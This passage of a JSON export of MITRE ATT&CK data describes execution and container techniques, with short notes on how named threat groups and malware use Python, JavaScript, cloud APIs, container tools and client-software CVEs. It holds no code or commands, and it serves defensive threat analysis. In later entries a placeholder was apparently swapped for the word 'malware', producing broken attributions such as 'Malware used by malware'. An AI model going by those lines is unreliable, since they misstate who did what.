                        "Description": "<name> is a Python-based backdoor compiled with PyInstaller.[21]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> used Python scripts for port scanning or building reverse shells.[22]"
                    },
                    "S0377": {
                        "ID": "S0377",
                        "Name": "Ebury",
                        "Description": "<name> has used Python to implement its DGA.[23]"
                    },
                    "S1120": {
                        "ID": "S1120",
                        "Name": "FRAMESTING",
                        "Description": "<name> is a Python web shell that can embed in the Ivanti Connect Secure CAV Python package.[24]"
                    },
                    "S0581": {
                        "ID": "S0581",
                        "Name": "IronNetInjector",
                        "Description": "<name> can use IronPython scripts to load payloads with the help of a .NET injector.[25]"
                    },
                    "S0387": {
                        "ID": "S0387",
                        "Name": "KeyBoy",
                        "Description": "<name> uses Python scripts for installing files and performing execution.[26]"
                    },
                    "S0276": {
                        "ID": "S0276",
                        "Name": "Keydnap",
                        "Description": "<name> uses Python for scripting to execute additional commands.[27]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used a macOS Python implant to gather data as well as MailFetcher.py code to automatically collect email data.[28][29]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> is written in Python and is used in conjunction with additional Python scripts.[30][31][32]"
                    },
                    "G0095": {
                        "ID": "G0095",
                        "Name": "Machete",
                        "Description": "<name> used multiple compiled Python scripts on the victim\u2019s system. <name>'s main backdoor <name> is also written in Python.[33][30][32]"
                    },
                    "S0459": {
                        "ID": "S0459",
                        "Name": "MechaFlounder",
                        "Description": "<name> uses a python-based payload.[34]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has developed tools in Python including Out1.[35]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors' backdoors were written in Python and compiled with py2exe.[36]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> was executed with a Python script and worked in conjunction with additional Python-based post-exploitation tools.[37]"
                    },
                    "S0196": {
                        "ID": "S0196",
                        "Name": "PUNCHBUGGY",
                        "Description": "<name> has used python scripts.[38]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can use an add on feature when creating payloads that allows you to create custom Python scripts (\"scriptlets\") to perform tasks offline (without requiring a session) such as sandbox detection, adding persistence, etc.[39]"
                    },
                    "S1032": {
                        "ID": "S1032",
                        "Name": "PyDCrypt",
                        "Description": "<name>, along with its functions, is written in Python.[40]"
                    },
                    "S0583": {
                        "ID": "S0583",
                        "Name": "Pysa",
                        "Description": "<name> has used Python scripts to deploy ransomware.[41]"
                    },
                    "S0332": {
                        "ID": "S0332",
                        "Name": "Remcos",
                        "Description": "<name> uses Python scripts.[42]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> has used Python-based malware to install and spread their coinminer.[43]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> is written in Python and can use multiple Python scripts for execution on targeted systems.[44][45]"
                    },
                    "S1035": {
                        "ID": "S1035",
                        "Name": "Small Sieve",
                        "Description": "<name> can use Python scripts to execute commands.[46]"
                    },
                    "S0374": {
                        "ID": "S0374",
                        "Name": "SpeakUp",
                        "Description": "<name> uses Python scripts.[47]"
                    },
                    "G0131": {
                        "ID": "G0131",
                        "Name": "Tonto Team",
                        "Description": "<name> has used Python-based tools for execution.[48]"
                    },
                    "S0647": {
                        "ID": "S0647",
                        "Name": "Turian",
                        "Description": "<name> has the ability to use Python to spawn a Unix shell.[49]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used IronPython scripts as part of the IronNetInjector toolchain to drop payloads.[25]"
                    },
                    "G0128": {
                        "ID": "G0128",
                        "Name": "ZIRCONIUM",
                        "Description": "<name> has used Python-based implants to interact with compromised hosts.[50][1]"
                    }
                }
            },
            "007": {
                "name": "JavaScript",
                "href": "/techniques/T1059/007",
                "description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.[1]JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the Component Object Model and Internet Explorer HTML Application (HTA) pages.[2][3][4]JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and AppleScript. Scripts can be executed via the command line utility osascript, they can be compiled into applications or script files via osacompile, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.[5][6][7][8][9]Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a Drive-by Compromise or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of Obfuscated Files or Information.",
                "Procedure": {
                    "S0622": {
                        "ID": "S0622",
                        "Name": "AppleSeed",
                        "Description": "<name> has the ability to use JavaScript to execute PowerShell.[10]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used JavaScript for drive-by downloads and C2 communications.[11][12]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> uses JavaScript to perform its core functionalities. [13][14]"
                    },
                    "S0640": {
                        "ID": "S0640",
                        "Name": "Avaddon",
                        "Description": "<name> has been executed through a malicious JScript downloader.[15][16]"
                    },
                    "S0482": {
                        "ID": "S0482",
                        "Name": "Bundlore",
                        "Description": "<name> can execute JavaScript by injecting it into the victim's browser.[17]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "During <name>, the threat actors used a malicious HTA file that contained a mix of encoded HTML and JavaScript/VBScript code.[18]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "During <name>, APT41 deployed JScript web shells on compromised systems.[19]"
                    },
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "<name> has used JavaScript and Node.Js information stealer script that exfiltrates data using the node process.[20]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has executed JavaScript scriptlets on the victim's machine.[21][22][23][24][25][26]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "The <name> System Profiler can use JavaScript to perform reconnaissance actions.[27]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> uses JavaScript to perform its core functionalities.[28]"
                    },
                    "S0695": {
                        "ID": "S0695",
                        "Name": "Donut",
                        "Description": "<name> can generate shellcode outputs that execute via JavaScript or JScript.[29]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has manipulated legitimate websites to inject malicious JavaScript code as part of their watering hole operations.[30]"
                    },
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> has used JavaScript to execute malicious code on a victim's machine.[31]"
                    },
                    "S0634": {
                        "ID": "S0634",
                        "Name": "EnvyScout",
                        "Description": "<name> can write files to disk with JavaScript using a modified version of the open-source tool FileSaver.[32]"
                    },
                    "G0120": {
                        "ID": "G0120",
                        "Name": "Evilnum",
                        "Description": "<name> has used malicious JavaScript files on the victim's machine.[33]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has used malicious JavaScript to steal payment card data from e-commerce sites.[34]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> used JavaScript scripts to help perform tasks on the victim's machine.[35][36][35]"
                    },
                    "S0417": {
                        "ID": "S0417",
                        "Name": "GRIFFON",
                        "Description": "<name> is written in and executed as JavaScript.[37]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> used JavaScript to execute additional files.[38][39][40]"
                    },
                    "G0119": {
                        "ID": "G0119",
                        "Name": "Indrik Spider",
                        "Description": "<name> has used malicious JavaScript files for several components of their attack.[41]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can use a JavaScript file as part of its execution chain.[42]"
                    },
                    "S0283": {
                        "ID": "S0283",
                        "Name": "jRAT",
                        "Description": "<name> has been distributed as HTA files with JScript.[43]"
                    },
                    "S0648": {
                        "ID": "S0648",
                        "Name": "JSS Loader",
                        "Description": "<name> can download and execute JavaScript files.[44]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used JScript for logging and downloading additional tools.[45][46]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has executed malicious JavaScript code.[47]"
                    },
                    "S1075": {
                        "ID": "S1075",
                        "Name": "KOPILUWAK",
                        "Description": "<name> had used Javascript to perform its core functions.[48]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has used JavaScript in its attacks.[49]"
                    },
                    "G0077": {
                        "ID": "G0077",
                        "Name": "Leafminer",
                        "Description": "<name> infected victims using JavaScript code.[50]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> includes payloads written in JavaScript.[51]"
                    },
                    "G0021": {
                        "ID": "G0021",
                        "Name": "Molerats",
                        "Description": "<name> used various implants, including those built with JS, on target machines.[52]"
                    },
                    "G1019": {
                        "ID": "G1019",
                        "Name": "MoustachedBouncer",
                        "Description": "<name> has used JavaScript to deliver malware hosted on HTML pages.[53]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used JavaScript files to execute its POWERSTATS payload.[54][55][56]"
                    },
                    "S0228": {
                        "ID": "S0228",
                        "Name": "NanHaiShu",
                        "Description": "<name> executes additional Jscript code on the victim's machine.[57]"
                    },
                    "C0016": {
                        "ID": "C0016",
                        "Name": "Operation Dust Storm",
                        "Description": "During <name>, the threat actors used JavaScript code.[58]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> can use JavaScript code for execution.[54]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "The <name> web inject module can inject Java Script into web banking pages visited by the victim.[59][60]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has used JavaScript to drop and execute malware loaders.[61][62]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has used JS scripts.[63]"
                    },
                    "S1124": {
                        "ID": "S1124",
                        "Name": "SocGholish",
                        "Description": "The <name> payload is executed as JavaScript.[64][65][66][67]"
                    },
                    "S0646": {
                        "ID": "S0646",
                        "Name": "SpicyOmelette",
                        "Description": "<name> has the ability to execute arbitrary JavaScript code on a compromised host.[68]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used JavaScript for code execution.[69][70]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used various JavaScript-based backdoors.[71]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> can execute JavaScript containing configuration data for establishing persistence.[72]"
                    },
                    "S1116": {
                        "ID": "S1116",
                        "Name": "WARPWIRE",
                        "Description": "<name> is a credential harvester written in JavaScript.[73]"
                    },
                    "S0341": {
                        "ID": "S0341",
                        "Name": "Xbash",
                        "Description": "<name> can execute malicious JavaScript payloads on the victim\u2019s machine.[74]"
                    }
                }
            },
            "008": {
                "name": "Network Device CLI",
                "href": "/techniques/T1059/008",
                "description": "Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or SSH.Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.[1]",
                "Procedure": {}
            },
            "009": {
                "name": "Cloud API",
                "href": "/techniques/T1059/009",
                "description": "Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, PowerShell modules like Azure for PowerShell[1], or software developer kits (SDKs) available for languages such as Python.  Cloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.With proper permissions (often via use of credentials such as Application Access Token and Web Session Cookie), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has leveraged the Microsoft Graph API to perform various actions across Azure and M365 environments. They have also utilized AADInternals PowerShell Modules to access the API [2]"
                    },
                    "S1091": {
                        "ID": "S1091",
                        "Name": "Pacu",
                        "Description": "<name> leverages the AWS CLI for its operations.[3]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has leveraged AWS CLI to enumerate cloud environments with compromised credentials.[4]"
                    }
                }
            },
            "010": {
                "name": "AutoHotKey & AutoIT",
                "href": "/techniques/T1059/010",
                "description": "Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.[1][2]Adversaries may use AHK (.ahk) and AutoIT (.au3) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as Phishing payloads.[3]These scripts may also be compiled into self-contained executable payloads (.exe).[1][2]",
                "Procedure": {
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has utilized AutoIt malware scripts embedded in Microsoft Office documents or malicious links.[4]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> uses AutoIt scripts dropped to a hidden directory during initial installation phases, such as test.au3.[5]"
                    },
                    "S0530": {
                        "ID": "S0530",
                        "Name": "Melcoz",
                        "Description": "<name> has been distributed through an AutoIt loader script.[6]"
                    }
                }
            }
        },
        "tactic": "Execution",
        "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.There are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.[1][2][3]",
        "Procedure": {
            "G0073": {
                "ID": "G0073",
                "Name": "APT19",
                "Description": "malware downloaded and launched code within a SCT file.[4]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware has used COM scriptlets to download Cobalt Strike beacons.[5]"
            },
            "G0067": {
                "ID": "G0067",
                "Name": "APT37",
                "Description": "malware has used Ruby scripts to execute payloads.[6]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has utilized custom scripts to perform internal reconnaissance.[7][8]"
            },
            "S0234": {
                "ID": "S0234",
                "Name": "Bandook",
                "Description": "malware can support commands to execute Java-based payloads.[9]"
            },
            "S0486": {
                "ID": "S0486",
                "Name": "Bonadan",
                "Description": "malware can create bind and reverse shells on the infected system.[10]"
            },
            "S0023": {
                "ID": "S0023",
                "Name": "CHOPSTICK",
                "Description": "malware is capable of performing remote command execution.[11][12]"
            },
            "C0029": {
                "ID": "C0029",
                "Name": "Cutting Edge",
                "Description": "During malware, threat actors used Perl scripts to enable the deployment of the THINSPOOL shell script dropper and for enumerating host data.[13][14]"
            },
            "S0334": {
                "ID": "S0334",
                "Name": "DarkComet",
                "Description": "malware can execute various types of scripts on the victim\u2019s machine.[15]"
            },
            "S0695": {
                "ID": "S0695",
                "Name": "Donut",
                "Description": "malware can generate shellcode outputs that execute via Ruby.[16]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has used the command line for execution.[17]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware uses a command-line interface to interact with systems.[18]"
            },
            "G0053": {
                "ID": "G0053",
                "Name": "FIN5",
                "Description": "malware scans processes on all victim systems in the environment and uses automated scripts to pull back the results.[19]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "malware has used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.[20][21]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware used SQL scripts to help perform tasks on the victim's machine.[22][23][22]"
            },
            "S0618": {
                "ID": "S0618",
                "Name": "FIVEHANDS",
                "Description": "malware can receive a command line argument to limit file encryption to specified directories.[24][25]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has used a Perl reverse shell to communicate with C2.[26]"
            },
            "S0460": {
                "ID": "S0460",
                "Name": "Get2",
                "Description": "malware has the ability to run executables with command-line arguments.[27]"
            },
            "S0032": {
                "ID": "S0032",
                "Name": "gh0st RAT",
                "Description": "malware is able to open a remote shell to execute commands.[28][29]"
            },
            "S0434": {
                "ID": "S0434",
                "Name": "Imminent Monitor",
                "Description": "malware has a CommandPromptPacket and ScriptPacket module(s) for creating a remote shell and executing scripts.[30]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "Malware used by malware can run commands on the command-line interface.[31][32]"
            },
            "S0487": {
                "ID": "S0487",
                "Name": "Kessel",
                "Description": "malware can create a reverse shell between the infected host and a specified system.[10]"
            },
            "S0167": {
                "ID": "S0167",
                "Name": "Matryoshka",
                "Description": "malware is capable of providing Meterpreter shell access.[33]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has used various types of scripting for execution.[34][35][36][37][38]"
            },
            "C0005": {
                "ID": "C0005",
                "Name": "Operation Spalax",
                "Description": "For malware, the threat actors used Nullsoft Scriptable Install System (NSIS) scripts to install malware.[39]"
            },
            "S0598": {
                "ID": "S0598",
                "Name": "P.A.S. Webshell",
                "Description": "malware has the ability to create reverse shells with Perl scripts.[40]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware has executed a Lua script through a Lua interpreter for Windows.[41]"
            },
            "S1110": {
                "ID": "S1110",
                "Name": "SLIGHTPULSE",
                "Description": "malware contains functionality to execute arbitrary commands passed to it.[42]"
            },
            "S0374": {
                "ID": "S0374",
                "Name": "SpeakUp",
                "Description": "malware uses Perl scripts.[43]"
            },
            "G0038": {
                "ID": "G0038",
                "Name": "Stealth Falcon",
                "Description": "malware malware uses WMI to script data collection and command execution on the victim.[44]"
            },
            "G0107": {
                "ID": "G0107",
                "Name": "Whitefly",
                "Description": "malware has used a simple remote shell tool that will call back to the C2 server and wait for commands.[45]"
            },
            "G0124": {
                "ID": "G0124",
                "Name": "Windigo",
                "Description": "malware has used a Perl script for information gathering.[10]"
            },
            "S0219": {
                "ID": "S0219",
                "Name": "WINERACK",
                "Description": "malware can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.[46]"
            },
            "S0330": {
                "ID": "S0330",
                "Name": "Zeus Panda",
                "Description": "malware can launch remote scripts on the victim\u2019s machine.[47]"
            }
        }
    },
    "T1609": {
        "ttp_name": "Container Administration Command",
        "ttp_id": "T1609",
        "href": "/techniques/T1609",
        "tactic": "Execution",
        "description": "Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.[1][2][3]In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as docker exec to execute a command within a running container.[4][5] In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as kubectl exec.[6]",
        "Procedure": {
            "S0601": {
                "ID": "S0601",
                "Name": "Hildegard",
                "Description": "malware was executed through the kubelet API run command and by executing commands on running containers.[7]"
            },
            "S0599": {
                "ID": "S0599",
                "Name": "Kinsing",
                "Description": "malware was executed with an Ubuntu container entry point that runs shell scripts.[8]"
            },
            "S0683": {
                "ID": "S0683",
                "Name": "Peirates",
                "Description": "malware can use kubectl or the Kubernetes API to run commands.[9]"
            },
            "S0623": {
                "ID": "S0623",
                "Name": "Siloscape",
                "Description": "malware can send kubectl commands to victim clusters through an IRC channel and can run kubectl locally to spread once within a victim cluster.[10]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware executed Hildegard through the kubelet API run command and by executing commands on running containers.[7]"
            }
        }
    },
    "T1610": {
        "ttp_name": "Deploy Container",
        "ttp_id": "T1610",
        "href": "/techniques/T1610",
        "tactic": "Defense Evasion",
        "description": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to Escape to Host and access other containers running on the node. [1]Containers can be deployed by various means, such as via Docker's create and start APIs or via a web application such as the Kubernetes dashboard or Kubeflow. [2][3][4] In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes.[5] Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.[6]",
        "Procedure": {
            "S0600": {
                "ID": "S0600",
                "Name": "Doki",
                "Description": "malware was run through a deployed container.[7]"
            },
            "S0599": {
                "ID": "S0599",
                "Name": "Kinsing",
                "Description": "malware was run through a deployed Ubuntu container.[8]"
            },
            "S0683": {
                "ID": "S0683",
                "Name": "Peirates",
                "Description": "malware can deploy a pod that mounts its node\u2019s root file system, then execute a command to create a reverse shell on the node.[9]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has deployed different types of containers into victim environments to facilitate execution.[10][11] malware has also transferred cryptocurrency mining software to Kubernetes clusters discovered within local IP address ranges.[12]"
            }
        }
    },
    "T1203": {
        "ttp_name": "Exploitation for Client Execution",
        "ttp_id": "T1203",
        "href": "/techniques/T1203",
        "tactic": "Execution",
        "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.Several types exist:Browser-based ExploitationWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.Office ApplicationsCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.Common Third-party ApplicationsOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
        "Procedure": {
            "G0018": {
                "ID": "G0018",
                "Name": "admin@338",
                "Description": "malware has exploited client software vulnerabilities for execution, such as Microsoft Word CVE-2012-0158.[1]"
            },
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware has exploited Office vulnerabilities such as CVE-2017-11882 and CVE-2017-8570 for execution during delivery.[2]"
            },
            "G0138": {
                "ID": "G0138",
                "Name": "Andariel",
                "Description": "malware has exploited numerous ActiveX vulnerabilities, including zero-days.[3][4][5]"
            },
            "G1007": {
                "ID": "G1007",
                "Name": "Aoqin Dragon",
                "Description": "malware has exploited CVE-2012-0158 and CVE-2010-3333 for execution against targeted systems.[6]"
            },
            "G0005": {
                "ID": "G0005",
                "Name": "APT12",
                "Description": "malware has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).[7][8]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has exploited Microsoft Office vulnerability CVE-2017-0262 for execution.[9]"
            },
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware has used multiple software exploits for common client software, like Microsoft Word, Exchange, and Adobe Reader, to gain code execution.[10][11][12]"
            },
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "malware has exploited the Adobe Flash Player vulnerability CVE-2015-3113 and Internet Explorer vulnerability CVE-2014-1776.[13][14]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware has used RTF document that includes an exploit to execute malicious code. (CVE-2017-11882)[15]"
            },
            "G0064": {
                "ID": "G0064",
                "Name": "APT33",
                "Description": "malware has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250), and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774).[16][17]"
            },
            "G0067": {
                "ID": "G0067",
                "Name": "APT37",
                "Description": "malware has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.[18][19][20][21]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.[22]"
            },
            "G0001": {
                "ID": "G0001",
                "Name": "Axiom",
                "Description": "malware has used exploits for multiple vulnerabilities including CVE-2014-0322, CVE-2012-4792, CVE-2012-1889, and CVE-2013-3893.[23]"
            },
            "S0239": {
                "ID": "S0239",
                "Name": "Bankshot",
                "Description": "malware leverages a known zero-day vulnerability in Adobe Flash to execute the implant into the victims\u2019 machines.[24]"
            },
            "G1002": {
                "ID": "G1002",
                "Name": "BITTER",
                "Description": "malware has exploited Microsoft Office vulnerabilities CVE-2012-0158, CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802.[25][26]"
            },
            "G0098": {
                "ID": "G0098",
                "Name": "BlackTech",
                "Description": "malware has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, and Adobe Flash CVE-2015-5119.[27]"
            },
            "G0060": {
                "ID": "G0060",
                "Name": "BRONZE BUTLER",
                "Description": "malware has exploited Microsoft Office vulnerabilities CVE-2014-4114, CVE-2018-0802, and CVE-2018-0798 for execution.[28][29]"
            },
            "G0080": {
                "ID": "G0080",
                "Name": "Cobalt Group",
                "Description": "malware had exploited multiple vulnerabilities for execution, including Microsoft\u2019s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.[30][31][32][33][34][35][36][37]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can exploit Oracle Java vulnerabilities for execution, including CVE-2011-3544, CVE-2013-2465, CVE-2012-4681, and CVE-2013-2460.[38][39]"
            },
            "G0142": {
                "ID": "G0142",
                "Name": "Confucius",
                "Description": "malware has exploited Microsoft Office vulnerabilities, including CVE-2015-1641, CVE-2017-11882, and CVE-2018-0802.[40][41]"
            },
            "G0012": {
                "ID": "G0012",
                "Name": "Darkhotel",
                "Description": "malware has exploited Adobe Flash vulnerability CVE-2015-8651 for execution.[42]"
            },
            "S0243": {
                "ID": "S0243",
                "Name": "DealersChoice",
                "Description": "malware leverages vulnerable versions of Flash to perform execution.[43]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has exploited CVE-2011-0611 in Adobe Flash Player to gain execution on a targeted system.[44]"
            },
            "G0066": {
                "ID": "G0066",
                "Name": "Elderwood",
                "Description": "malware has used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits.[45]"
